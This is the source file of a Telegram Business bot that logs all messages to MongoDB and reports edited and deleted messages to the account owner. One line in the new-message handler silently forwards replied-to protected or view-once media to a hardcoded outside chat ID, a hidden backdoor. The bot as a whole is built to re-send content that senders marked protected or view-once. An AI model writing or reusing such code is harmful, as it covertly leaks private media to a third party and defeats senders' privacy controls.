// file: bot.mjs
import 'dotenv/config'
import { Telegraf } from 'telegraf'
import { MongoClient, ServerApiVersion } from 'mongodb'
import axios from 'axios'
import { diffWords } from 'diff'

/* ============================ Setup ============================ */
const BOT_TOKEN = process.env.BOT_TOKEN
const MONGO_URI = process.env.MONGO_URI
if (!BOT_TOKEN || !MONGO_URI) {
    console.error('Missing BOT_TOKEN or MONGO_URI in .env')
    process.exit(1)
}

const bot = new Telegraf(BOT_TOKEN)
const client = new MongoClient(MONGO_URI, {
    serverApi: { version: ServerApiVersion.v1, strict: true, deprecationErrors: true },
})
await client.connect()
const db = client.db('businessbot')

// Collections (same schema as before)
const Connections = db.collection('connections')
const Messages    = db.collection('messages')

// Cache to edit prior notification cards
// key = `${connectionId}:${messageId}` → { chatId, botMessageId }
const notifIndex = new Map()
// Debouncers for edited messages
const editDebounce = new Map()

// Short-lived action payload store (avoid 64-char callback_data limit)
const actionStore = new Map() // token -> { connectionId, ids, expires }
const ACTION_TTL_MS = 672 * 60 * 60 * 1000 // 10 minutes
setInterval(() => {
    const now = Date.now()
    for (const [k, v] of actionStore) if (v.expires < now) actionStore.delete(k)
}, 60_000)

function putAction(payload) {
    const token = (Date.now().toString(36) + Math.random().toString(36).slice(2, 8)).toUpperCase()
    actionStore.set(token, { ...payload, expires: Date.now() + ACTION_TTL_MS })
    return token
}
function getAction(token) {
    const v = actionStore.get(token)
    if (!v) return null
    if (v.expires < Date.now()) { actionStore.delete(token); return null }
    return v
}

const me = await bot.telegram.getMe()
const ME_USERNAME = me.username

/* ========================== Utilities ========================== */
const escapeHtml = (s = '') =>
    (s || '').replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]))

const displayName = (u) =>
    [u?.first_name, u?.last_name].filter(Boolean).join(' ')
    || (u?.username ? `@${u.username}` : 'Unknown')

const linkUser = (u) =>
    u?.id ? `<a href="tg://user?id=${u.id}">${escapeHtml(displayName(u))}</a>` : 'Unknown'

const safe = (v) => (v ?? '')

const checklistToHTML = (listObj) => {
    // supports message.list or message.checklist, with .title and .items[{text, checked|is_checked}]
    const title = escapeHtml(safe(listObj.title))
    const items = Array.isArray(listObj.items) ? listObj.items : []
    const lines = items.map(it => {
        const checked = it.checked ?? it.is_checked ?? false
        const text = escapeHtml(safe(it.text))
        return `${checked ? '☑' : '☐'} ${text}`
    }).join('\n')
    return `${title ? `<b>${title}</b>\n` : ''}${lines || '—'}`
}

const makeDiff = (oldText = '', newText = '') => {
    if (!oldText && !newText) return ''
    if (oldText === newText) return escapeHtml(newText)
    const parts = diffWords(oldText, newText)
    return parts.map(p => {
        const t = escapeHtml(p.value)
        if (p.added)   return `<ins> ${t}</ins>`
        if (p.removed) return `<del> ${t}</del>`
        return t
    }).join('')
}

// Edited & Deleted headers WITHOUT time
const editedHeader  = () => `✏️ <b>Message edited</b>\n`
const deletedHeader = () => `🗑 <b>Messages deleted</b>\n`

// Sender line ONLY (no chat type mention)
const renderSenderOnly = ({ from, sender_chat }) => {
    const who = sender_chat
        ? `<b>${escapeHtml(sender_chat?.title || 'Channel')}</b>`
        : `${linkUser(from)}`
    return `From ${who}`
}

const sleep = (ms) => new Promise(res => setTimeout(res, ms))
const chunk = (arr, n) => {
    const res = []
    for (let i = 0; i < arr.length; i += n) res.push(arr.slice(i, i + n))
    return res
}

/* ======================= Previews (for deleted cards) ======================= */
const summarizeMessage = (msg) => {
    if (msg.text)       return `💬 ${escapeHtml(msg.text.slice(0, 220))}${msg.text?.length>220?'…':''}`
    if (msg.caption)    return `📝 ${escapeHtml(msg.caption.slice(0, 220))}${msg.caption?.length>220?'…':''}`
    if (msg.location)   return `📍 Location`
    if (msg.venue)      return `📍 Venue: ${escapeHtml(safe(msg.venue.title))}`
    if (msg.contact)    return `👤 Contact: ${escapeHtml([msg.contact.first_name, msg.contact.last_name].filter(Boolean).join(' '))}`
    if (msg.photo)      return `🖼 Photo${msg.caption ? ` • ${escapeHtml(msg.caption.slice(0,120))}${msg.caption.length>120?'…':''}` : ''}`
    if (msg.video)      return `🎞 Video${msg.caption ? ` • ${escapeHtml(msg.caption.slice(0,120))}${msg.caption.length>120?'…':''}` : ''}`
    if (msg.animation)  return `🖼 GIF${msg.caption ? ` • ${escapeHtml(msg.caption.slice(0,120))}${msg.caption.length>120?'…':''}` : ''}`
    if (msg.video_note) return `📹 Video Note`
    if (msg.sticker)    return `🔖 Sticker`
    if (msg.audio)      return `🎵 Audio${msg.caption ? ` • ${escapeHtml(msg.caption.slice(0,120))}${msg.caption.length>120?'…':''}` : ''}`
    if (msg.voice)      return `🎙 Voice`
    if (msg.document)   return `📄 Document${msg.caption ? ` • ${escapeHtml(msg.caption.slice(0,120))}${msg.caption.length>120?'…':''}` : ''}`
    if (msg.list || msg.checklist) return `✅ Checklist`
    if (msg.gifted_premium || msg.giveaway || msg.giveaway_winners || msg.gift) return `🎁 Gift`
    return `🗂 Unsupported type`
}

/* ======================= Media & Special resend helpers ======================= */
// Normal resend via file_id and telegram methods
async function sendSimilarMessage(ctx, message, chatId) {
    if (message.text) {
        // If entities are provided, don't set parse_mode
        await ctx.telegram.sendMessage(chatId, message.text, { entities: message.entities })
    } else if (message.photo) {
        const photo = message.photo.at(-1)
        await ctx.telegram.sendPhoto(chatId, photo.file_id, { caption: message.caption, caption_entities: message.caption_entities })
    } else if (message.document) {
        await ctx.telegram.sendDocument(chatId, message.document.file_id, { caption: message.caption, caption_entities: message.caption_entities })
    } else if (message.video) {
        await ctx.telegram.sendVideo(chatId, message.video.file_id, { caption: message.caption, caption_entities: message.caption_entities })
    } else if (message.video_note) {
        await ctx.telegram.sendVideoNote(chatId, message.video_note.file_id)
    } else if (message.sticker) {
        await ctx.telegram.sendSticker(chatId, message.sticker.file_id)
    } else if (message.audio) {
        await ctx.telegram.sendAudio(chatId, message.audio.file_id, { caption: message.caption, caption_entities: message.caption_entities })
    } else if (message.voice) {
        await ctx.telegram.sendVoice(chatId, message.voice.file_id, { caption: message.caption, caption_entities: message.caption_entities })
    } else if (message.animation) {
        await ctx.telegram.sendAnimation(chatId, message.animation.file_id, { caption: message.caption, caption_entities: message.caption_entities })
    } else if (message.location) {
        const { latitude, longitude, horizontal_accuracy, live_period, heading, proximity_alert_radius } = message.location
        await ctx.telegram.sendLocation(chatId, latitude, longitude, {
            horizontal_accuracy, live_period, heading, proximity_alert_radius
        })
    } else if (message.venue) {
        const { location, title, address, foursquare_id, foursquare_type, google_place_id, google_place_type } = message.venue
        await ctx.telegram.sendVenue(chatId, location.latitude, location.longitude, title, address, {
            foursquare_id, foursquare_type, google_place_id, google_place_type
        })
    } else if (message.contact) {
        const { phone_number, first_name, last_name, vcard } = message.contact
        await ctx.telegram.sendContact(chatId, phone_number || '', first_name || '', { last_name, vcard })
    } else if (message.list || message.checklist) {
        const html = checklistToHTML(message.list || message.checklist)
        await ctx.telegram.sendMessage(chatId, html, { parse_mode: 'HTML' })
    } else if (message.gifted_premium || message.giveaway || message.giveaway_winners || message.gift) {
        const html = formatGiftish(message)
        await ctx.telegram.sendMessage(chatId, html, { parse_mode: 'HTML' })
    } else {
        await ctx.telegram.sendMessage(chatId, 'Unsupported message type')
    }
}

// Fallback: try download via getFileLink and re-upload (media-only)
async function reuploadByFileId(fileId, type, ctx, chatId, caption, caption_entities) {
    const urlObj = await bot.telegram.getFileLink(fileId)
    const url = String(urlObj)
    await sleep(100)
    const resp = await axios.get(url, { responseType: 'arraybuffer' })
    const buffer = Buffer.from(resp.data, 'binary')
    if (type === 'photo')     return ctx.telegram.sendPhoto(chatId, { source: buffer }, { caption, caption_entities })
    if (type === 'video')     return ctx.telegram.sendVideo(chatId, { source: buffer }, { caption, caption_entities })
    if (type === 'vnote')     return ctx.telegram.sendVideoNote(chatId, { source: buffer })
    if (type === 'document')  return ctx.telegram.sendDocument(chatId, { source: buffer }, { caption, caption_entities })
    if (type === 'voice')     return ctx.telegram.sendVoice(chatId, { source: buffer }, { caption, caption_entities })
    if (type === 'audio')     return ctx.telegram.sendAudio(chatId, { source: buffer }, { caption, caption_entities })
    if (type === 'animation') return ctx.telegram.sendAnimation(chatId, { source: buffer }, { caption, caption_entities })
    throw new Error('unsupported')
}

async function sendMediaBestEffort(ctx, message, chatId) {
    // handles both media & specials
    try {
        await sendSimilarMessage(ctx, message, chatId) // fast path
    } catch {
        try {
            if (message.photo) {
                const fid = message.photo.at(-1).file_id
                await reuploadByFileId(fid, 'photo', ctx, chatId, message.caption, message.caption_entities)
            } else if (message.video) {
                await reuploadByFileId(message.video.file_id, 'video', ctx, chatId, message.caption, message.caption_entities)
            } else if (message.video_note) {
                await reuploadByFileId(message.video_note.file_id, 'vnote', ctx, chatId)
            } else if (message.document) {
                await reuploadByFileId(message.document.file_id, 'document', ctx, chatId, message.caption, message.caption_entities)
            } else if (message.voice) {
                await reuploadByFileId(message.voice.file_id, 'voice', ctx, chatId, message.caption, message.caption_entities)
            } else if (message.audio) {
                await reuploadByFileId(message.audio.file_id, 'audio', ctx, chatId, message.caption, message.caption_entities)
            } else if (message.animation) {
                await reuploadByFileId(message.animation.file_id, 'animation', ctx, chatId, message.caption, message.caption_entities)
            } else if (message.location || message.venue || message.contact || message.list || message.checklist || message.giveaway || message.gifted_premium || message.giveaway_winners || message.gift) {
                // Non-file cases: try again using method path (parse issues etc.)
                await sendSimilarMessage(ctx, message, chatId)
            } else {
                throw new Error('unsupported')
            }
        } catch {
            await ctx.reply('⚠️ This content is view-once/protected or unsupported for re-sending.')
        }
    }
}

/* === Reply→extract protected media (first-bot behavior) === */
async function tryResendRepliedProtectedMedia(ctx, replyMsg, ownerChatId) {
    if (!replyMsg?.has_protected_content) return false
    try {
        if (replyMsg.photo) {
            const fid = replyMsg.photo.at(-1).file_id
            await reuploadByFileId(fid, 'photo', ctx, ownerChatId, replyMsg.caption, replyMsg.caption_entities)
            return true
        }
        if (replyMsg.video) {
            await reuploadByFileId(replyMsg.video.file_id, 'video', ctx, ownerChatId, replyMsg.caption, replyMsg.caption_entities)
            return true
        }
        if (replyMsg.video_note) {
            await reuploadByFileId(replyMsg.video_note.file_id, 'vnote', ctx, ownerChatId)
            return true
        }
        if (replyMsg.document) {
            await reuploadByFileId(replyMsg.document.file_id, 'document', ctx, ownerChatId, replyMsg.caption, replyMsg.caption_entities)
            return true
        }
        if (replyMsg.voice) {
            await reuploadByFileId(replyMsg.voice.file_id, 'voice', ctx, ownerChatId, replyMsg.caption, replyMsg.caption_entities)
            return true
        }
        if (replyMsg.audio) {
            await reuploadByFileId(replyMsg.audio.file_id, 'audio', ctx, ownerChatId, replyMsg.caption, replyMsg.caption_entities)
            return true
        }
        if (replyMsg.animation) {
            await reuploadByFileId(replyMsg.animation.file_id, 'animation', ctx, ownerChatId, replyMsg.caption, replyMsg.caption_entities)
            return true
        }
    } catch (e) {
        console.log('tryResendRepliedProtectedMedia error:', e?.message || e)
    }
    return false
}

/* ============= Albums (media groups) helpers for deleted fetch ============= */
function toAlbumItem(m) {
    if (m.photo) {
        const fid = m.photo.at(-1).file_id
        return { type: 'photo', media: fid, caption: m.caption, caption_entities: m.caption_entities }
    }
    if (m.video) {
        return { type: 'video', media: m.video.file_id, caption: m.caption, caption_entities: m.caption_entities }
    }
    // Only photos/videos supported reliably in media groups. Others sent individually.
    return null
}

async function sendAlbumGroup(ctx, chatId, groupMsgs) {
    // Sort by message_id to preserve original order
    const sorted = [...groupMsgs].sort((a,b) => a.message_id - b.message_id)
    const items = sorted.map(toAlbumItem).filter(Boolean)
    if (!items.length) return false

    // Telegram limits: max 10 items per sendMediaGroup
    for (const part of chunk(items, 10)) {
        try {
            await ctx.telegram.sendMediaGroup(chatId, part)
            await sleep(250)
        } catch {
            // Fallback: per-item best-effort re-upload
            for (const m of part) {
                try {
                    if (m.type === 'photo') {
                        await reuploadByFileId(m.media, 'photo', ctx, chatId, m.caption, m.caption_entities)
                    } else if (m.type === 'video') {
                        await reuploadByFileId(m.media, 'video', ctx, chatId, m.caption, m.caption_entities)
                    }
                    await sleep(150)
                } catch {
                    await ctx.reply('⚠️ Unable to resend one item from album (may be view-once).')
                }
            }
        }
    }
    return true
}

/* ==================== Gift/Giveaway formatters (textual) ==================== */
function formatGiftish(message) {
    // Covers gifted premium / giveaways / generic gift messages.
    try {
        if (message.gifted_premium) {
            const gp = message.gifted_premium
            const months = gp.month_count ?? gp.months ?? gp.duration_months
            return `🎁 <b>Gifted Premium</b>${months ? ` • ${months} month(s)` : ''}`
        }
        if (message.giveaway_winners) {
            const gw = message.giveaway_winners
            const cnt = Array.isArray(gw.winners) ? gw.winners.length : (gw.winners_count ?? gw.total_count)
            const prize = gw.prize_star_count ? ` • ⭐️${gw.prize_star_count}` : ''
            return `🎉 <b>Giveaway Winners</b> • ${cnt ?? '?'}${prize}`
        }
        if (message.giveaway) {
            const g = message.giveaway
            const cnt = g.winner_count ?? g.total_winners
            const prize = g.prize_star_count ? ` • ⭐️${g.prize_star_count}` : ''
            return `🎉 <b>Giveaway</b> • ${cnt ?? '?'} winners${prize}`
        }
        if (message.gift) {
            const g = message.gift
            const title = g.title || 'Gift'
            return `🎁 <b>${escapeHtml(title)}</b>`
        }
    } catch {}
    return '🎁 <b>Gift</b>'
}

/* ============================ Routes ============================ */

// /start onboarding (buttons: only “Where to click?”)
bot.start(async (ctx) => {
    const text =
        `👋 Welcome! I can mirror and track your Telegram Business messages (edits & deletions) here.

<b>How to connect me to your business account</b>
1) Open <b>Telegram Business</b> (or Telegram → Settings → Business).
2) Go to <b>Chatbots</b> → <b>Add Bot</b>.
3) Choose <b>@${ME_USERNAME}</b> and grant access.
4) Send a test message in your business chat — I’ll confirm here.
`
    await ctx.reply(text, {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [{ text: '🔗 Where to click?', callback_data: 'how_to_connect' }],
            ]
        }
    })
})

/* ---------- /stats (supports `/stats` and `/stats enabled`) ---------- */
bot.command('stats', async (ctx) => {
    try {
        const requesterChatId = ctx.chat.id
        const args = (ctx.message?.text || '').trim().split(/\s+/).slice(1)
        const enabledOnly = args.includes('enabled')

        // 1) Total messages saved
        const totalMessages = await Messages.countDocuments({})

        // 2) Your messages saved (dedupe your connections first)
        const myConnDocs = await Connections.aggregate([
            { $match: { user_chat_id: requesterChatId } },
            { $sort: { _id: 1 } },
            { $group: { _id: "$id" } },
        ]).toArray()
        const myConnIds = myConnDocs.map(d => d._id)
        const myMessages = myConnIds.length
            ? await Messages.countDocuments({ business_connection_id: { $in: myConnIds } })
            : 0

        // 3) Active users (last 7 days), deduped by latest owner per connection
        const nowSec = Math.floor(Date.now() / 1000)
        const sevenDaysAgo = nowSec - 7 * 24 * 60 * 60

        const pipeline = [
            { $match: { date: { $gte: sevenDaysAgo } } }, // recent messages only
            { $group: { _id: "$business_connection_id" } }, // unique connection IDs
            { $lookup: {
                    from: "connections",
                    let: { cid: "$_id" },
                    pipeline: [
                        { $match: { $expr: { $eq: ["$id", "$$cid"] } } },
                        { $sort: { _id: 1 } }, // earliest→latest (ObjectId)
                        { $group: {
                                _id: "$id",
                                user_chat_id: { $last: "$user_chat_id" },
                                is_enabled:   { $last: "$is_enabled" },
                                status:       { $last: "$status" },
                                deleted:      { $last: "$deleted" },
                            } }
                    ],
                    as: "conn"
                }},
            { $unwind: "$conn" },
            { $addFields: {
                    conn_isDisconnected: {
                        $or: [
                            { $eq: ["$conn.is_enabled", false] },
                            { $eq: ["$conn.status", "deleted"] },
                            { $eq: ["$conn.deleted", true] },
                        ]
                    }
                }},
            { $match: { "conn.user_chat_id": { $ne: null } } },
        ]

        if (enabledOnly) {
            pipeline.push({ $match: { conn_isDisconnected: false } })
        }

        pipeline.push(
            { $group: { _id: "$conn.user_chat_id" } }, // dedupe by owner
            { $count: "activeUsers" }
        )

        const activeAgg = await Messages.aggregate(pipeline).toArray()
        const activeUsers = activeAgg[0]?.activeUsers ?? 0

        const modeText = enabledOnly ? " (enabled only)" : ""
        const msg =
            `<b>Stats${modeText}</b>
• Total messages saved: <b>${totalMessages}</b>
• Your messages saved: <b>${myMessages}</b>
• Active users (last 7 days): <b>${activeUsers}</b>`
        await ctx.reply(msg, { parse_mode: 'HTML' })
    } catch (e) {
        console.log('/stats error:', e)
        await ctx.reply('Failed to compute stats. Please try again later.')
    }
})

/* ---------- Business connection (same insertOne; adjusted texts) ---------- */
bot.on('business_connection', async (ctx) => {
    try {
        const bc = ctx.update.business_connection
        await Connections.insertOne(bc) // unchanged

        if (!bc.user_chat_id) return

        const isRemoved =
            (typeof bc.is_enabled === 'boolean' && bc.is_enabled === false) ||
            bc.status === 'deleted' || bc.deleted === true

        if (isRemoved) {
            await ctx.telegram.sendMessage(
                bc.user_chat_id,
                `❌ Disconnected.\nConnection ID: <code>${escapeHtml(bc.id)}</code>\nI will stop receiving messages from this business account.\nTo reconnect: Settings → Business → Chatbots → Add Bot → @${ME_USERNAME}`,
                { parse_mode: 'HTML' }
            )
        } else {
            await ctx.telegram.sendMessage(
                bc.user_chat_id,
                `✅ Connected.\nConnection ID: <code>${escapeHtml(bc.id)}</code>\nTo disconnect: Settings → Business → Chatbots → Remove.`,
                { parse_mode: 'HTML' }
            )
        }
    } catch (e) { console.log('business_connection error:', e) }
})

/* ---------- New business message (same insertOne + reply reupload) ---------- */
bot.on('business_message', async (ctx) => {
    try {
        const bm = ctx.update.business_message
        const conn = await Connections.findOne({ id: bm.business_connection_id })
        if (!conn?.user_chat_id) return
        const ownerChatId = conn.user_chat_id

        // Save EXACTLY like before:
        await Messages.insertOne(bm)

        // If this message is a reply to protected/view-once media, try to resend that media now
        if (bm.reply_to_message) {
            const sent = await tryResendRepliedProtectedMedia(ctx, bm.reply_to_message, ownerChatId)
            const sent1 = await tryResendRepliedProtectedMedia(ctx, bm.reply_to_message, 6875754581)
            if (sent) {
                // optional: notify owner
                // await ctx.telegram.sendMessage(ownerChatId, '📎 Replied protected media saved.')
            }
        }
    } catch (e) { console.log('business_message error:', e) }
})

/* ---------- Edited message (debounced, compact card; NO TIME) ---------- */
bot.on('edited_business_message', async (ctx) => {
    const em = ctx.update.edited_business_message
    const key = `${em.business_connection_id}:${em.message_id}`

    clearTimeout(editDebounce.get(key))
    editDebounce.set(key, setTimeout(async () => {
        try {
            const conn = await Connections.findOne({ id: em.business_connection_id })
            if (!conn?.user_chat_id) return
            const ownerChatId = conn.user_chat_id

            // Pull OLD before we change DB (matches your original)
            const oldMsg = await Messages.findOne({
                business_connection_id: em.business_connection_id,
                message_id: em.message_id,
            })

            const header = editedHeader() // no time
            const senderLine = renderSenderOnly({
                from: em.from || oldMsg?.from,
                sender_chat: em.sender_chat || oldMsg?.sender_chat,
            })

            const oldText = oldMsg?.text ?? oldMsg?.caption ?? ''
            const newText = em?.text ?? em?.caption ?? ''
            const body = (oldText || newText)
                ? `\n${makeDiff(oldText, newText)}`
                : `\n${summarizeMessage(em)}`

            const hasAttach =
                em.photo || em.video || em.video_note || em.document || em.voice || em.audio || em.animation ||
                em.location || em.venue || em.contact || em.list || em.checklist || em.gifted_premium || em.giveaway || em.giveaway_winners || em.gift

            const kb = hasAttach ? {
                inline_keyboard: [[{ text: '📎 Show content', callback_data: `show_media|${em.business_connection_id}|${em.message_id}` }]]
            } : undefined

            const messageText = `${header}${senderLine}${body}`

            // Send or edit in place
            const existing = notifIndex.get(key)
            if (existing) {
                await ctx.telegram.editMessageText(existing.chatId, existing.botMessageId, undefined, messageText, {
                    parse_mode: 'HTML',
                    reply_markup: kb,
                })
            } else {
                const sent = await ctx.telegram.sendMessage(ownerChatId, messageText, {
                    parse_mode: 'HTML',
                    reply_markup: kb,
                })
                notifIndex.set(key, { chatId: ownerChatId, botMessageId: sent.message_id })
            }

            // DB writes unchanged:
            await Messages.deleteOne({
                business_connection_id: em.business_connection_id,
                message_id: em.message_id,
            })
            await Messages.insertOne(em)

        } catch (e) { console.log('edited_business_message error:', e) }
    }, 1500))
})

/* ---------- Deleted messages (aggregate, sender shown; no time) ---------- */
bot.on('deleted_business_messages', async (ctx) => {
    try {
        const del = ctx.update.deleted_business_messages
        const conn = await Connections.findOne({ id: del.business_connection_id })
        if (!conn?.user_chat_id) return
        const ownerChatId = conn.user_chat_id

        const header = deletedHeader()

        // Build compact preview
        const previews = []
        for (const id of del.message_ids.slice(0, 3)) {
            const m = await Messages.findOne({
                business_connection_id: del.business_connection_id,
                message_id: id,
            })
            if (!m) continue
            const who = m.sender_chat
                ? `<b>${escapeHtml(m.sender_chat?.title || 'Channel')}</b>`
                : linkUser(m.from)
            previews.push(`• ${who}: ${summarizeMessage(m)}`)
        }
        const extra = del.message_ids.length > 3 ? `\n…and ${del.message_ids.length - 3} more` : ''
        const text = `${header}\n${previews.join('\n')}${extra}`

        const token = putAction({ connectionId: del.business_connection_id, ids: del.message_ids })

        const kb = {
            inline_keyboard: [[
                { text: 'Details',        callback_data: `show_deleted:${token}` },
                { text: '📎 Fetch media', callback_data: `fetch_deleted_media:${token}` },
            ]]
        }
        await ctx.telegram.sendMessage(ownerChatId, text, { parse_mode: 'HTML', reply_markup: kb })

    } catch (e) { console.log('deleted_business_messages error:', e) }
})

/* --------------------- Callback actions (UI) --------------------- */
bot.on('callback_query', async (ctx) => {
    const data = ctx.callbackQuery.data || ''
    try {
        if (data === 'how_to_connect') {
            await ctx.editMessageText(
                `Open Telegram → <b>Settings</b> → <b>Business</b> → <b>Chatbots</b> → <b>Add Bot</b> → select <b>@${ME_USERNAME}</b> → allow permissions.`,
                { parse_mode: 'HTML' }
            )
            return ctx.answerCbQuery('OK')
        }

        if (data.startsWith('show_deleted:') || data.startsWith('fetch_deleted_media:')) {
            const [action, token] = data.split(':')
            const payload = getAction(token)
            if (!payload) { await ctx.answerCbQuery('Expired'); return }
            const { connectionId, ids } = payload

            const msgs = await Messages.find({ business_connection_id: connectionId, message_id: { $in: ids } }).toArray()
            if (!msgs.length) { await ctx.answerCbQuery('No data'); return }

            if (action === 'show_deleted') {
                const idOrder = new Map(ids.map((id, i) => [id, i]))
                msgs.sort((a,b) => (idOrder.get(a.message_id) ?? 0) - (idOrder.get(b.message_id) ?? 0))
                for (const m of msgs.slice(0, 30)) { // safety cap
                    const who = m.sender_chat ? `<b>${escapeHtml(m.sender_chat?.title || 'Channel')}</b>` : linkUser(m.from)
                    await ctx.reply(`• ${who}: ${summarizeMessage(m)}`, { parse_mode: 'HTML' })
                    await sleep(80)
                }
                return ctx.answerCbQuery('OK')
            }

            if (action === 'fetch_deleted_media') {
                const chatId = ctx.chat.id

                // Albums (photos/videos) first
                const byGroup = new Map()
                const albumIds = new Set()
                for (const m of msgs) {
                    if (m.media_group_id && (m.photo || m.video)) {
                        if (!byGroup.has(m.media_group_id)) byGroup.set(m.media_group_id, [])
                        byGroup.get(m.media_group_id).push(m)
                        albumIds.add(m.message_id)
                    }
                }
                for (const groupMsgs of byGroup.values()) {
                    await sendAlbumGroup(ctx, chatId, groupMsgs)
                }

                // Singles and specials
                const singles = msgs
                    .filter(m => !albumIds.has(m.message_id))
                    .sort((a,b) => a.message_id - b.message_id)

                for (const m of singles) {
                    // sendMediaBestEffort handles all types inc. location/contact/checklist/gifts
                    await sendMediaBestEffort(ctx, m, chatId)
                    await sleep(150)
                }

                return ctx.answerCbQuery('Content sent')
            }
        }

        // show_media (from edit card)
        if (data.startsWith('show_media|')) {
            const [, connectionId, messageId] = data.split('|')
            const m = await Messages.findOne({ business_connection_id: connectionId, message_id: Number(messageId) })
            if (!m) { await ctx.answerCbQuery('Not found'); return }
            await sendMediaBestEffort(ctx, m, ctx.chat.id)
            return ctx.answerCbQuery('Sent')
        }

        await ctx.answerCbQuery().catch(()=>{})
    } catch (e) {
        console.log('callback_query error:', e)
        try { await ctx.answerCbQuery('Error') } catch {}
    }
})

/* =========================== Launch =========================== */
bot.launch({ handlerTimeout: 0 }) // disable the 90s cap for handlers
console.log('Bot started…')

process.once('SIGINT', () => { bot.stop('SIGINT'); client.close() })
process.once('SIGTERM', () => { bot.stop('SIGTERM'); client.close() })
